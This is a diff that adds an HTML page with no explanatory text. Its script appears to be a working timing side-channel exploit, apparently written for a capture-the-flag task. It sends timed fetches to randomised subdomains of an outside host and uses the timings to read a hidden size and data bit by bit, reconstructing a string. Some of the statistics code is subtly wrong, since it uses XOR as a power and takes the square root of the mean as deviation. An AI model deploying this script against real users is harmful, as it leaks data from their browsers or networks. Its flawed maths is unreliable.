@@ -1,0 +1,147 @@
+<html>
+<script>
+async function test(cmd, base) {
+  const req = new Request("http://" + cmd + ".Z" + Math.random().toString(36).substring(7) + '.' + base);
+  var ret = true;
+  var begin = performance.now();
+  await fetch(req, {'mode':'no-cors'}).catch(e => {});
+  var end = performance.now();
+  return end-begin;
+}
+
+function generate_hex_range(start, finish) {
+  var ret = new Array(finish - start);
+  for (var i = 0; i < ret.length; ++i)
+    ret[i] = (start + i).toString(16);
+  return ret;
+}
+
+async function parallel_test(cmds, base) {
+  var ret = Array(cmds.length);
+  for (var i = 0; i < ret.length; ++i)
+    ret[i] = await test(cmds[i], base);
+  return ret;
+  //return Promise.all(cmds.map(i => test(i, base)));
+}
+
+function do_iqstats(samples) {
+  var ret = {"mean":0,"variance":0};
+
+  // First remove upper quartile
+  //samples.sort((a,b) => a - b);
+  //var q = (samples.length + 1)/4;
+  //samples = samples.slice(0, 3 * q);
+
+  samples.forEach(i => {
+    ret["mean"] += (i / samples.length);
+    ret["variance"] += (i^2 / samples.length);
+  });
+
+  ret["variance"] -= ret["mean"]^2;
+  ret["sd"] = Math.sqrt(ret["mean"]);
+
+  return ret;
+}
+
+function derive_boundaries(set_samples, unset_samples) {
+  var ret = {};
+
+  var   set_stats = do_iqstats(  set_samples);
+  var unset_stats = do_iqstats(unset_samples);
+
+  ret["unset_lower"] = unset_stats["mean"] - unset_stats["sd"] * 8;
+  ret["unset_upper"] = unset_stats["mean"] + unset_stats["sd"] * 8;
+  ret[  "set_lower"] =   set_stats["mean"] -   set_stats["sd"] * 8;
+  ret[  "set_upper"] =   set_stats["mean"] +   set_stats["sd"] * 8;
+
+  if (ret[  "set_lower"] <= unset_stats["mean"] ||
+      ret["unset_upper"] >=   set_stats["mean"]) {
+    console.log(set_stats, unset_stats, ret);
+    throw "Too much response variance!";
+  }
+
+  return ret;
+}
+
+async function query(cmd, base, boundaries) {
+  while (true) {
+    var res = await test(cmd, base);
+    if (res < boundaries["unset_lower"])
+      console.log("< " + res);
+    else if (res < boundaries["unset_upper"])
+      return 0;
+    else if (res < boundaries["set_lower"])
+      console.log("~ " + res);
+    else if (res < boundaries["set_upper"])
+      return 1;
+    else
+      console.log("> " + res);
+  }
+}
+
+async function parallel_query(cmd, args, base, boundaries) {
+  var ret = Array(args.length);
+  for (var i = 0; i < ret.length; ++i)
+    ret[i] = await query(cmd + '.' + args[i], base, boundaries);
+  return ret;
+  //return Promise.all(args.map(i => query(cmd + '.' + i, base, boundaries)));
+}
+
+async function brute(base) {
+  console.log("Clearing initial lag");
+  await parallel_test(Array(2).fill("r.1"), base);
+
+  console.log("Getting boundaries");
+
+
+  var   set_samples = [];
+  var unset_samples = [];
+  //for (var i = 0; i < 8; ++i) {
+  //  var is_set = [];
+  //  for (var sample = 0; sample < 4; ++sample)
+  //    is_set[sample] = (Math.random() >= 0.5);
+  //  var res = await parallel_test(is_set.map(i => i ? "r.1" : "r.0"), base);
+  //  for (var sample = 0; sample < 4; ++sample)
+  //    (is_set[sample] ? set_samples : unset_samples).push(res[sample]);
+  //}
+  for (var i = 0; i < 4; ++i) {
+    for (var j = 0; j < (5 - i); ++j) {
+        set_samples =   set_samples.concat(await parallel_test(Array(i).fill("r.1"), base));
+      unset_samples = unset_samples.concat(await parallel_test(Array(i).fill("r.0"), base));
+    }
+  }
+
+  console.log(set_samples, unset_samples);
+
+  var boundaries = derive_boundaries(set_samples, unset_samples);
+  console.log(boundaries);
+
+  var size_bits = [];
+  for (var i = 0; i < 52; i += 4) {
+    size_bits = size_bits.concat(await parallel_query("s", generate_hex_range(i, i + 4), base, boundaries));
+  }
+
+  var size = 0;
+  for (var i = 0; i <= size_bits.length; ++i)
+    size += (size_bits[i] << i);
+
+  console.log("Getting " + size + " bits");
+
+  var result = Array(size / 8).fill(0);
+  for (var byte = 0; byte < size; byte += 8) {
+    var res = await parallel_query("d", generate_hex_range(byte, byte + 4), base, boundaries);
+    res = res.concat(await parallel_query("d", generate_hex_range(byte + 4, byte + 8), base, boundaries));
+    for (var bit = 0; bit < 8; ++bit)
+      result[byte/8] += (res[bit] << bit);
+  }
+
+  console.log(result)
+
+  var str = "";
+  for (char of result) str += String.fromCharCode(char);
+
+  console.log(str)
+}
+brute("xflt.c3murk.dev");
+</script>
+</html>
